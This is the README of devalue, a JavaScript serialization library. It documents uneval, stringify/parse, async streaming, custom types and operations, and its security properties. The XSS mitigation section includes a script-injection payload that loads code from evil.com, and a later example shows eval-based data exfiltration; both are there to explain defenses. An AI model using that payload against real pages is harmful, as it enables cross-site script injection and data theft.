# devalue

Like `JSON.stringify`, but handles

- cyclical references (`obj.self = obj`)
- repeated references (`[value, value]`)
- `undefined`, `Infinity`, `NaN`, `-0`
- regular expressions
- dates
- `Map` and `Set`
- `BigInt`
- `ArrayBuffer` and Typed Arrays
- `URL` and `URLSearchParams`
- `Temporal`
- custom types via replacers, reducers and revivers
- promises (via `stringifyAsync`)
- streamed promises and async iterables (via `unevalStream`)

Try it out [here](https://svelte.dev/repl/138d70def7a748ce9eda736ef1c71239?version=3.49.0).

## Goals:

- Performance
- Security (see [XSS mitigation](#xss-mitigation))
- Compact output

## Non-goals:

- Human-readable output
- Stringifying functions
- Stability of serialization mechanisms between versions (i.e. if you `devalue.stringify` with one version and `devalue.parse` with another, things may break)

## Usage

There are two ways to use `devalue`:

### `uneval`

This function takes a JavaScript value and returns the JavaScript code to create an equivalent value — sort of like `eval` in reverse:

```js
import * as devalue from 'devalue';

let obj = { message: 'hello' };
devalue.uneval(obj); // '{message:"hello"}'

obj.self = obj;
devalue.uneval(obj); // '(function(a){a.message="hello";a.self=a;return a}({}))'
```

Use `uneval` when you want the most compact possible output and don't want to include any code for parsing the serialized value.

### `stringify` and `parse`

These two functions are analogous to `JSON.stringify` and `JSON.parse`:

```js
import * as devalue from 'devalue';

let obj = { message: 'hello' };

let stringified = devalue.stringify(obj); // '[{"message":1},"hello"]'
devalue.parse(stringified); // { message: 'hello' }

obj.self = obj;

stringified = devalue.stringify(obj); // '[{"message":1,"self":0},"hello"]'
devalue.parse(stringified); // { message: 'hello', self: [Circular] }
```

Use `stringify` and `parse` when evaluating JavaScript isn't an option.

### `stringifyAsync`

`stringifyAsync` is an async version of `stringify` that can handle promises:

```js
import * as devalue from 'devalue';

let obj = {
	quick: 'data',
	slow: fetch('/api/slow').then((r) => r.json())
};

let stringified = await devalue.stringifyAsync(obj);
devalue.parse(stringified); // { quick: 'data', slow: { ... } }
```

Promises are awaited and their resolved values are serialized. The output format is identical to `stringify`, so `parse` and `unflatten` work unchanged.

### `unevalStream`

`unevalStream` returns executable source before every asynchronous value has settled. Native Promises and ordinary AsyncIterables work without a replacer:

```js
import { unevalStream } from 'devalue';

const { head, tail } = await unevalStream({
	quick: 'data',
	slow: fetch('/api/slow').then((response) => response.json())
});

const data = (0, eval)(`(${head})`);
for await (const block of tail) (0, eval)(block);
```

`head` is a self-contained JavaScript expression whose result is the reconstructed root. Each value from `tail` is a self-contained statement beginning with `;`. Evaluate `head` once, then evaluate every tail block exactly once, in yield order, in the same global realm. Concatenation is also valid:

```js
const blocks = [];
for await (const block of tail) blocks.push(block);
const root = new Function(`const root=(${head});${blocks.join('')};return root`)();
```

The first ready asynchronous event schedules a zero-delay flush. Events observed before that callback runs are emitted as one ordered batch; already-settled events may therefore be included in `head`. This is an operational host-scheduling window, not a portable guarantee about exact task counts or boundaries. A flush makes the current batch eligible for delivery, but later events can still join it until the consumer takes it. Each source contributes at most one ready sequence item, and that source is pulled again only after its previous item is yielded in a tail batch or included in `head`.

#### Immutable streaming graphs

`unevalStream` is designed for finite, request-scoped hydration, not as an indefinitely running event bus. It retains captured graph nodes and enough client paths to preserve identity across the whole session. Server sequence pulling is bounded—there is at most one outstanding pull and one unconsumed ready item per source—but total memory is not necessarily bounded: unique identities are retained for the session, generated blocks may be buffered by the transport, and reconstructed native async iterators buffer yields until the application reads them. Callers must eventually finish or cancel the finite stream.

From the first traversal until the server tail completes, the represented server graph must remain structurally and state immutable. From evaluating `head` until the tail completes and every delivered block has been evaluated, the reconstructed client graph has the same requirement. Do not change properties, array elements or lengths, Map or Set membership/order, buffers, views, built-in scalar state, or any other devalue-visible value. Devalue captures container edges and scalar reconstruction metadata during traversal. ArrayBuffer bytes are an exception: the captured byte data is a retained live view, not a copied snapshot, and is safe only under this immutable-input contract. The library does not deep-freeze values. A future capture-once design could copy bytes, but this API does not currently perform or promise that copy. On the client, application changes can invalidate retained identity paths; Promise settlement and descriptor-generated updates may mutate only the client targets they own.

An object already captured by the session must not be mutated and reused as a later sequence item to represent a new state. Allocate a new object for each new state instead. Ordinary application mutation becomes unrestricted only after `tail` has completed, every delivered block—including the final block—has been evaluated, and no more transport delivery remains. Server completion alone is not sufficient.

#### Namespacing and cancellation

Active sessions are held in a private null-prototype table stored at `globalThis.__d` by default. The head initializes this table; applications must not initialize or replace it. Pass `options.scope` to use another trusted, assignable JavaScript expression, and `options.id` for a deterministic session key:

```js
const controller = new AbortController();
const stream = await unevalStream(data, replacer, {
	scope: 'globalThis.appStreams',
	id: 'request-42',
	signal: controller.signal
});
```

`scope` is trusted source configuration, not data, and must resolve to the same table location for every block. Devalue owns that private namespace: if it is defined, it is assumed to be the null-prototype session table. Application replacement, corruption, deletion, or direct session access is unsupported. Deterministic `options.id` values must be unique among concurrent streams in the client realm; duplicates are unsupported and may overwrite a session. Automatically generated IDs are collision-resistant identifiers, not secrets.

The tail is one-shot. `tail.return()` and `AbortSignal` cancellation synchronously stop accepting source events and starting new pulls. For every committed source, devalue initiates the sequence iterator's `return()` and then its descriptor `cancel()` before awaiting any cleanup result; each hook is invoked at most once. An explicit AbortSignal reason or source-generation failure remains the primary reason, including when it is `null`, `0`, `false`, or an empty string. Without such a reason, `tail.return()` reports the first cleanup failure in source-discovery order (`return()` before `cancel()` for one source) and reports secondary failures through `onerror`.

Cleanup does not wait for an outstanding iterator `next()` merely to finish, and a source without `return()` cannot make cancellation wait on that pull. Devalue does await cleanup hooks it actually invokes, so cancellation can still remain pending if user cleanup never settles. In particular, a native async generator queues `return()` behind an in-flight `next()`; awaited work inside such a generator needs its own cooperative external cancellation mechanism. Native Promises themselves cannot be canceled, only ignored after termination.

The tail behaves like an async generator: concurrent `tail.next()` calls settle in order, and once it has completed or thrown, further calls resolve `{ done: true }`. Successful completion immediately detaches server lifecycle listeners and never invokes cancellation hooks; this happens when the final block is delivered, without requiring another `tail.next()`. Normal exhaustion deletes the completed client session entry only when that final emitted block is evaluated; the owned empty table remains at `scope` for reuse.

Generated blocks travel one way and have no client-to-server control channel. Cancellation, abort, a dropped transport, or an abandoned tail cannot execute pending client operations, while client-side `return()` cannot cancel server pulling. Removing the namespace entry identified by `id` can release that lookup entry after abandonment, but it does not settle reconstructed Promises or iterators and is not a disposal protocol. Use `tail.return()` or the stream's `AbortSignal` for cooperative server cancellation, and keep the transport alive until all required blocks have arrived and been evaluated. Future detached or independently disposable hydration is outside this API.

Native AsyncIterables reconstruct as buffered `AsyncIterableIterator` values. Their `next()` calls may be concurrent and preserve server yield order. Buffered yields are delivered before the server's return value or error. That terminal outcome is delivered once—to the first `next()` after the yield queue empties—and later `next()` calls resolve `{ done: true, value: undefined }`. With several pending reads, yields settle them FIFO, the first remaining read receives the return value or error, and all other reads complete with `undefined`.

Client-side `return(value)` and `throw(reason)` are local, including after a server terminal update has arrived. Both discard buffered yields and an unconsumed server outcome and make future `next()` calls complete with `undefined`. `return(value)` resolves pending reads as done with `undefined` and itself returns `{ done: true, value }`; `throw(reason)` rejects pending reads and itself with the exact reason. Repeated local close calls follow the same method-level result, while later generated updates are ignored. Generated blocks have no reverse channel, so local closure does not close the server iterator. Use `tail.return()` or the stream's `AbortSignal` to cancel server pulling and invoke the source iterator's `return()`.

Reconstructed native Promises have an internal no-op rejection observer from construction time so a rejection delivered before application hydration handlers are attached does not become an unhandled rejection. The original Promise is returned unchanged and remains rejected with the original reason. This applies only to the built-in native Promise adapter, not custom descriptors.

#### Custom asynchronous values

A replacer receives a `js` template tag and may return a synchronous source fragment, an `AsyncValueDescriptor`, or an `AsyncSequenceDescriptor`. Ordinary template holes are serialized values; nested fragments created by `js` compose as source. This example adapts a nonthenable server object whose completion is Promise-like:

```js
class ServerJob {
	constructor(completion) {
		this.completion = completion;
	}
}

class RemoteJob {
	resolve(value) {
		this.value = value;
	}

	reject(reason) {
		this.error = reason;
	}
}

const replacer = (value, js) => {
	if (!(value instanceof ServerJob)) return;

	return {
		type: 'async-value',
		source: value.completion,
		construct: () => js`new RemoteJob()`,
		resolve: ({ target }, payload) => js`${target}.resolve(${payload})`,
		reject: ({ target }, reason) => js`${target}.reject(${reason})`
	};
};

const { head, tail } = await unevalStream(new ServerJob(jobPromise), replacer);
```

`construct` returns one synchronous client expression and runs exactly once. It may call its `capture(expression)` argument zero or one times to store a private controller, subsequently available as `reference.control`. Ordinary values interpolated into the returned construction or its composed capture expression are serialized through the same session graph, so they preserve identity with the head, payloads, and later operations. `resolve` and `reject` receive the target reference and an already serialized source expression. Custom Promise-like sources are supported only through a descriptor; arbitrary thenables are not recognized automatically. The user replacer runs before native Promise recognition and can override it.

AsyncIterables need no replacer when the client should receive a buffered async iterator. A descriptor can instead adapt one into a custom multi-shot client value:

```js
const sequenceReplacer = (value, js) => {
	if (!value?.events) return;

	return {
		type: 'async-sequence',
		source: value.events,
		construct: () => js`new RemoteSequence()`,
		next: ({ target }, item) => js`${target}.next(${item})`,
		complete: ({ target }, result) => js`${target}.complete(${result})`,
		error: ({ target }, reason) => js`${target}.error(${reason})`,
		cancel: () => value.close()
	};
};
```

The iterable's yields, return value and failure are serialized through `next`, `complete` and `error`. Only one pull is outstanding and one ready item is unconsumed at a time. If a sequence fails or yields an unserializable value, its generated client error is delivered without waiting for the iterator's `return()`; a later close failure is observed and reported through `onerror`. This individual-sequence failure does not by itself invoke the descriptor's cancellation hook.

Replacer results are strict: `undefined`, `null` and `false` mean no replacement; a fragment returned by `js` is a synchronous replacement; valid discriminated descriptors are asynchronous replacements; all other values, including raw strings, throw. Replacers are synchronous, not async, and run once per represented object. Fragment creation is lazy: values interpolated into fragments that are never returned or composed are not discovered.

Descriptor constructors and operation callbacks return `js` fragments. A constructor fragment represents one expression; an operation fragment may contain statements. Their target, optional control, payload and reason arguments are themselves composable fragments. Every other hole is an ordinary value serialized once through the shared session graph before the constructor or operation uses it, including objects, arrays, collections, buffers/views, and nested asynchronous values supported by the replacer. Static template text is trusted executable JavaScript; interpolate dynamic values so devalue escapes and serializes them. Names such as `RemoteJob` and `RemoteSequence` in the examples must exist in the global realm where the generated source is evaluated. Client constructor or generated-operation failures are unrecoverable.

Initial traversal, classification and construction-validation errors reject `unevalStream`. After an async boundary is established, an unserializable result transitions that client value to rejection/error using a generic Error; a serializable rejection reason retains graph identity. Failures in trusted `reject`/`error` operation generation terminate tail iteration and cancel server sources.

### `unflatten`

In the case where devalued data is one part of a larger JSON string, `unflatten` allows you to revive just the bit you need:

```js
import * as devalue from 'devalue';

const json = `{
  "type": "data",
  "data": ${devalue.stringify(data)}
}`;

const data = devalue.unflatten(JSON.parse(json).data);
```

## Custom types

You can serialize and deserialize custom types by passing a second argument to `stringify` containing an object of types and their _reducers_, and a second argument to `parse` or `unflatten` containing an object of types and their _revivers_:

```js
class Vector {
	constructor(x, y) {
		this.x = x;
		this.y = y;
	}

	magnitude() {
		return Math.sqrt(this.x * this.x + this.y * this.y);
	}
}

const stringified = devalue.stringify(new Vector(30, 40), {
	Vector: (value) => value instanceof Vector && [value.x, value.y]
});

console.log(stringified); // [["Vector",1],[2,3],30,40]

const vector = devalue.parse(stringified, {
	Vector: ([x, y]) => new Vector(x, y)
});

console.log(vector.magnitude()); // 50
```

If a function passed to `stringify` returns a truthy value, it's treated as a match.

You can also use custom types with `uneval` by specifying a custom replacer:

```js
devalue.uneval(vector, (value, js) => {
	if (value instanceof Vector) {
		return js`new Vector(${value.x},${value.y})`;
	}
}); // `new Vector(30,40)`
```

The replacer must return a source created with the supplied `js` tag, or `undefined`, `null` or `false` to serialize the value normally. Each value hole is recursively serialized, preserving shared references. In most cases, cyclic references are supported, but some rare direct custom dependencies are not, and will throw an error. For example:

```js
class Atomic {
	constructor() {
		this.other = undefined;
	}
}

const a = new Atomic();
const b = new Atomic();

a.other = b;
b.other = a;

uneval(a, (value, js) => {
	if (value instanceof Atomic) {
		return js`Object.assign(new Atomic(), { other: ${value.other} })`;
	}
});
```
Here, a and b are the original Atomic instances being serialized. Reconstructing them would conceptually require:

```js
const a = Object.assign(new Atomic(), { other: b });
const b = Object.assign(new Atomic(), { other: a });
```

Neither initializer can run first because each needs the other's final identity, and because `devalue` can't know how to construct an `Atomic`, it can't allocate it first and then assign to `other`.

In contrast, moving the cycle through a native serialized object provides an allocatable shell:

```js
const container = {};
const a = new Atomic();

a.other = container;
container.owner = a;
```

This can be reconstructed in phases:

```js
const container = {};
const a = Object.assign(new Atomic(), { other: container });
container.owner = a;
```

Note that any variables referenced in the resulting JavaScript (like `Vector` in the example above) must be in scope when it runs.

## Custom operations

Every introspection `stringify` performs on the value being serialized — property reads, prototype method calls, iteration, type classification — goes through an operations interface that you can override via the `operations` option. Omitted members fall back to the defaults (exported as `defaultStringifyOperations`), which behave exactly as devalue always has.

This is useful in two situations:

**Side-effect-free serialization.** By default, serializing a value can execute user code: getters and proxy traps fire during property reads, `Object.prototype.toString` consults (potentially getter-defined) `Symbol.toStringTag`, and patched prototype methods like `Date.prototype.toISOString` or `Map.prototype[Symbol.iterator]` are invoked. Deterministic or sandboxed runtimes can replace these operations with implementations based on captured intrinsics and property descriptors:

```js
const originalToISOString = Date.prototype.toISOString;

const stringified = devalue.stringify(value, undefined, {
	operations: {
		// use a captured intrinsic instead of a (possibly patched) prototype method
		toISOString: (date) => originalToISOString.call(date),

		// read through descriptors so getters are never invoked
		get: (object, key) => {
			const descriptor = Object.getOwnPropertyDescriptor(object, key);
			if (descriptor?.get) throw new Error(`refusing to invoke getter for "${key}"`);
			return descriptor?.value;
		}
	}
});
```

**Foreign-runtime serialization.** The `stringify` algorithm never touches the value directly, so "value" can be an opaque handle to something living in another JavaScript runtime — a `node:vm` context, a WASM-hosted engine, a remote process — as long as the operations know how to inspect it. Implement `typeOf`/`tagOf` for classification, `toPrimitive`/`get`/`entriesOf`/etc. for extraction, and `identify` to key deduplication and cycle detection on the underlying value's identity rather than the handle's:

```js
const stringified = devalue.stringify(rootHandle, undefined, {
	operations: {
		identify: (handle) => handle.pointer,
		typeOf: (handle) => handle.typeOf(),
		get: (handle, key) => handle.getProperty(key)
		// ... see StringifyOperations for the full interface
	}
});
```

Some operations have a non-obvious contract that is easy to get subtly wrong. Where the work is not specific to your values, devalue exports the pieces so you don't have to reimplement them — `filterArrayIndices` does the array-index filtering that `indicesOf` needs, given keys you already have:

```js
indicesOf: (handle) => devalue.filterArrayIndices(handle.ownEnumerableStringKeys())
```

Reducers compose with custom operations: they receive the raw value/handle, and whatever they return is serialized through the same operations.

### Customizing `parse`

The mirror image: `parse` and `unflatten` build every value through construction operations (`ParseOperations`, defaults exported as `defaultParseOperations`), so you can control what gets created. The members mirror `StringifyOperations` with the host/value-space boundary running the other way: each `fromXxx` inverts the corresponding `toXxx`, `fromXxxInfo` inverts `xxxInfo`, and the bare-verb mutators invert the bare-verb accessors (`set`/`get`, `addValue`/`valuesOf`, `addEntry`/`entriesOf`, `box`/`unbox`).

**Cross-realm revival.** By default the revived value is built from the intrinsics of whichever realm devalue is running in, so `instanceof` checks fail elsewhere. Constructing from a target realm's intrinsics fixes that:

```js
const revived = devalue.parse(serialized, undefined, {
	operations: {
		fromISOString: (iso) => new sandbox.Date(iso),
		createMap: () => new sandbox.Map(),
		createObject: () => sandbox.makeObject()
	}
});
```

**Foreign-runtime revival.** `parse` never inspects the values it creates — it only passes them back into other operations — so the operations can build values inside another runtime and return opaque handles:

```js
const rootHandle = devalue.parse(serialized, undefined, {
	operations: {
		fromPrimitive: (primitive) => vm.toHandle(primitive),
		createObject: () => vm.newObject(),
		set: (handle, key, value) => handle.setProp(key, value)
		// ... see ParseOperations for the full interface
	}
});
```

Containers are created empty and populated afterwards (`createMap` then `addEntry`, `createObject` then `set`, and so on) — that ordering is what allows cyclic values to be revived, since the empty container is cached before its contents are built.

Revivers compose the same way reducers do: they receive whatever the operations built, and their return value is used as-is.

## Error handling

If `uneval` or `stringify` encounters a function or a non-POJO that isn't handled by a custom replacer/reducer, it will throw an error. You can find where in the input data the offending value lives by inspecting `error.path`:

```js
try {
	const map = new Map();
	map.set('key', function invalid() {});

	uneval({
		object: {
			array: [map]
		}
	});
} catch (e) {
	console.log(e.path); // '.object.array[0].get("key")'
}
```

## XSS mitigation

Say you're server-rendering a page and want to serialize some state, which could include user input. `JSON.stringify` doesn't protect against XSS attacks:

```js
const state = {
	userinput: `</script><script src='https://evil.com/mwahaha.js'>`
};

const template = `
<script>
  // NEVER DO THIS
  var preloaded = ${JSON.stringify(state)};
</script>`;
```

Which would result in this:

```html
<script>
	// NEVER DO THIS
	var preloaded = {"userinput":"
</script>
<script src="https://evil.com/mwahaha.js">
	"};
</script>
```

Using `uneval` or `stringify`, we're protected against that attack:

```js
const template = `
<script>
  var preloaded = ${uneval(state)};
</script>`;
```

```html
<script>
	var preloaded = {
		userinput:
			"\\u003C\\u002Fscript\\u003E\\u003Cscript src='https:\\u002F\\u002Fevil.com\\u002Fmwahaha.js'\\u003E"
	};
</script>
```

This, along with the fact that `uneval` and `stringify` bail on functions and non-POJOs, stops attackers from executing arbitrary code. Strings generated by `uneval` can be safely deserialized with `eval` or `new Function`:

```js
const value = (0, eval)('(' + str + ')');
```

## Other security considerations

While `uneval` prevents the XSS vulnerability shown above, meaning you can use it to send data from server to client, **you should not send user data from client to server** using the same method. Since it has to be evaluated, an attacker that successfully submitted data that bypassed `uneval` would have access to your system.

When using `eval`, ensure that you call it _indirectly_ so that the evaluated code doesn't have access to the surrounding scope:

```js
{
	const sensitiveData = 'Setec Astronomy';
	eval('sendToEvilServer(sensitiveData)'); // pwned :(
	(0, eval)('sendToEvilServer(sensitiveData)'); // nice try, evildoer!
}
```

Using `new Function(code)` is akin to using indirect eval.

## See also

- [lave](https://github.com/jed/lave) by Jed Schmidt
- [arson](https://github.com/benjamn/arson) by Ben Newman. The `stringify`/`parse` approach in `devalue` was inspired by `arson`
- [oson](https://github.com/KnorpelSenf/oson) by Steffen Trog
- [tosource](https://github.com/marcello3d/node-tosource) by Marcello Bastéa-Forte
- [serialize-javascript](https://github.com/yahoo/serialize-javascript) by Eric Ferraiuolo
- [jsesc](https://github.com/mathiasbynens/jsesc) by Mathias Bynens
- [superjson](https://github.com/blitz-js/superjson) by Blitz
- [next-json](https://github.com/iccicci/next-json) by Daniele Ricci

## License

[MIT](LICENSE)
